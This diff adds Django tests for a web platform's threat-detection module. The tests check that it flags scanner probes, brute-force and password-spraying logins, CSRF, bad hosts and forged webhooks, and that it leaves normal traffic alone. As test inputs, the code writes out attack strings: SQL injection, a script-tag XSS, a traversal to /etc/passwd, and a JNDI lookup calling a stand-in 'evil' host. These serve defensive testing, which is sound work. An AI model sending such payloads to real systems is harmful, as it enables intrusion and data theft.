@@ -827,3 +827,186 @@ class StaffAlertTests(TestCase):
             services.after_support_message(thread, ChatMessage.objects.create(support=thread, user=self.ali, text=text))
         self.assertEqual(self.StaffAlert.objects.filter(kind='support').count(), before + 1)
 
+
+class ThreatDetectionTests(TestCase):
+    def setUp(self):
+        from unittest.mock import patch
+        from django.core.cache import cache
+        from core import security
+        from core.models import SecurityIncident, StaffAlert
+        cache.clear()
+        security._writes.clear()
+        security._flood.update(minute=0, hits=__import__('collections').Counter())
+        patcher = patch.object(security, 'WRITE_EVERY', 0)
+        patcher.start()
+        self.addCleanup(patcher.stop)
+        self.security = security
+        self.Incident = SecurityIncident
+        self.Alert = StaffAlert
+        self.boss = User.objects.create_superuser('boss', password='Very-Strong-77')
+        self.ali = User.objects.create_user('ali', password='Very-Strong-77', first_name='Ali')
+
+    def _kinds(self):
+        return set(self.Incident.objects.values_list('kind', flat=True))
+
+    def test_scanners_are_caught(self):
+        for path in ('/.env', '/wp-login.php', '/.git/config', '/phpmyadmin/index.php', '/shell.php', '/backup.sql'):
+            self.client.get(path)
+        self.assertEqual(self._kinds(), {'scan'})
+        self.assertEqual(self.Incident.objects.get().hits, 6)
+
+    def test_gathered_hits_keep_their_samples(self):
+        from unittest.mock import patch
+        with patch.object(self.security, 'WRITE_EVERY', 3600):
+            self.client.get('/.env')  # opens the incident
+            self.client.get('/wp-login.php')
+            self.client.get('/.git/config')
+        with patch.object(self.security, 'WRITE_EVERY', 0):
+            self.client.get('/xmlrpc.php')
+        incident = self.Incident.objects.get()
+        self.assertEqual(incident.hits, 4)
+        self.assertEqual(incident.samples, ['/.env', '/wp-login.php', '/.git/config', '/xmlrpc.php'])
+
+    def test_one_alert_per_incident_not_per_hit(self):
+        for _ in range(5):
+            self.client.get('/.env')
+        self.assertEqual(self.Alert.objects.filter(kind='security').count(), 1)
+
+    def test_injections_are_named(self):
+        cases = {'sql_injection': "?id=1' UNION SELECT password FROM users--", 'xss': '?q=<script>alert(1)</script>',
+                 'traversal': '?file=../../../../etc/passwd', 'code_exec': '?x=${jndi:ldap://evil/a}'}
+        for kind, query in cases.items():
+            self.client.get('/privacy/' + query)
+            self.assertIn(kind, self._kinds())
+
+    def test_encoded_injection_is_caught(self):
+        self.client.get('/privacy/?id=1%2527%2520union%2520select%25201')
+        self.assertIn('sql_injection', self._kinds())
+
+    def test_normal_pages_stay_quiet(self):
+        self.client.force_login(self.ali)
+        for url in ('/', '/privacy/', '/dashboard/?q=select+a+course', '/exams-list/', '/reyting/?tab=or+1'):
+            self.client.get(url)
+        self.assertEqual(self._kinds(), set())
+
+    def test_essay_text_in_a_post_is_never_read(self):
+        self.client.post('/login/', {'username': 'x', 'password': "' union select 1 -- <script>"})
+        self.assertNotIn('sql_injection', self._kinds())
+        self.assertFalse(any('union' in s for i in self.Incident.objects.all() for s in i.samples))
+
+    def test_staff_search_is_not_an_attack(self):
+        self.client.force_login(self.boss)
+        self.client.get('/panel/users/?q=union+select')
+        self.assertEqual(self._kinds(), set())
+
+    def test_flood_needs_many_anonymous_requests(self):
+        from unittest.mock import patch
+        with patch.object(self.security, 'FLOOD_LIMIT_ANONYMOUS', 5):
+            for _ in range(5):
+                self.client.get('/privacy/')
+        self.assertIn('flood', self._kinds())
+
+    def test_a_classroom_with_sessions_is_not_a_flood(self):
+        from unittest.mock import patch
+        self.client.force_login(self.ali)
+        with patch.object(self.security, 'FLOOD_LIMIT_ANONYMOUS', 5):
+            for _ in range(6):
+                self.client.get('/privacy/')
+        self.assertEqual(self._kinds(), set())
+
+    def _fail(self, username, ip='9.9.9.9'):
+        self.client.post('/login/', {'username': username, 'password': 'wrong'}, REMOTE_ADDR=ip)
+
+    def test_repeated_wrong_password_is_brute_force(self):
+        for _ in range(5):
+            self._fail('ali')
+        self.assertIn('brute_force', self._kinds())
+
+    def test_many_accounts_from_one_ip_is_spraying(self):
+        for n in range(8):
+            self._fail(f'user{n}')
+        self.assertIn('spray', self._kinds())
+
+    def test_one_account_from_many_ips_is_distributed(self):
+        for n in range(4):
+            self._fail('ali', f'9.9.9.{n + 1}')
+        self.assertIn('distributed', self._kinds())
+
+    def test_wrong_passwords_on_an_admin_are_flagged(self):
+        for _ in range(3):
+            self._fail('boss')
+        self.assertEqual(self.Incident.objects.get(kind='staff_target').user, self.boss)
+
+    def test_one_typo_is_not_an_attack(self):
+        self._fail('ali')
+        self.assertEqual(self._kinds(), set())
+
+    def test_success_after_many_failures_is_a_possible_breach(self):
+        for _ in range(3):
+            self._fail('boss')
+        self.client.post('/login/', {'username': 'boss', 'password': 'Very-Strong-77'}, REMOTE_ADDR='8.8.8.8')
+        self.assertEqual(self.Incident.objects.get(kind='breach').user, self.boss)
+
+    def test_forged_form_is_logged_quietly(self):
+        from django.test import Client
+        Client(enforce_csrf_checks=True).post('/login/', {'username': 'a', 'password': 'b'})
+        self.assertIn('csrf', self._kinds())
+        self.assertFalse(self.Alert.objects.filter(kind='security').exists())
+
+    def test_wrong_host_is_logged(self):
+        from django.test import override_settings
+        with override_settings(ALLOWED_HOSTS=['testserver']):
+            self.client.get('/privacy/', HTTP_HOST='evil.example')
+        self.assertIn('bad_host', self._kinds())
+
+    def test_fake_telegram_webhook_is_caught(self):
+        from tgbot import api
+        from unittest.mock import patch
+        with patch.object(api, 'webhook_secret', return_value='real'):
+            self.client.post(reverse('tgbot:webhook'), data='{}', content_type='application/json')
+        self.assertIn('webhook', self._kinds())
+
+    def test_student_opening_the_panel_is_noted(self):
+        self.client.force_login(self.ali)
+        self.client.get('/panel/users/')
+        self.assertEqual(self.Incident.objects.get(kind='panel_probe').user, self.ali)
+
+    def test_admin_rights_change_raises_an_alert(self):
+        self.client.force_login(self.boss)
+        self.client.post(reverse('panel:user_make_staff', args=[self.ali.pk]))
+        self.assertTrue(self.Alert.objects.filter(kind='security', title__contains='Admin huquqi').exists())
+
+    def test_security_tab_shows_attack_state_and_detail(self):
+        self.client.get('/privacy/?id=1 union select 1')
+        self.client.force_login(self.boss)
+        page = self.client.get(reverse('panel:alerts'), {'tab': 'security'})
+        self.assertEqual(page.context['threats']['state'], 'attack')
+        self.assertContains(page, 'SQL injection urinishi')
+        incident = self.Incident.objects.get()
+        detail = self.client.get(reverse('panel:threat_detail', args=[incident.pk]))
+        self.assertContains(detail, 'union select')
+
+    def test_opening_an_incident_reads_its_alert_and_it_is_not_listed_twice(self):
+        self.client.get('/.env')
+        self.client.force_login(self.boss)
+        page = self.client.get(reverse('panel:alerts'), {'tab': 'security'})
+        self.assertEqual(len(page.context['alerts']), 0)
+        self.client.get(reverse('panel:threat_detail', args=[self.Incident.objects.get().pk]))
+        self.assertEqual(self.Alert.unread_for(self.boss).count(), 0)
+
+    def test_page_is_escaped(self):
+        self.client.get('/privacy/?q=<script>alert(1)</script>')
+        self.client.force_login(self.boss)
+        incident = self.Incident.objects.get(kind='xss')
+        detail = self.client.get(reverse('panel:threat_detail', args=[incident.pk]))
+        self.assertNotContains(detail, '<script>alert(1)</script>')
+
+    def test_calm_state_without_attacks(self):
+        self.client.force_login(self.boss)
+        self.assertEqual(self.client.get(reverse('panel:alerts'), {'tab': 'security'}).context['threats']['state'], 'calm')
+
+    def test_students_cannot_read_incidents(self):
+        self.client.get('/.env')
+        self.client.force_login(self.ali)
+        self.assertEqual(self.client.get(reverse('panel:threat_detail', args=[self.Incident.objects.first().pk])).status_code, 302)
+
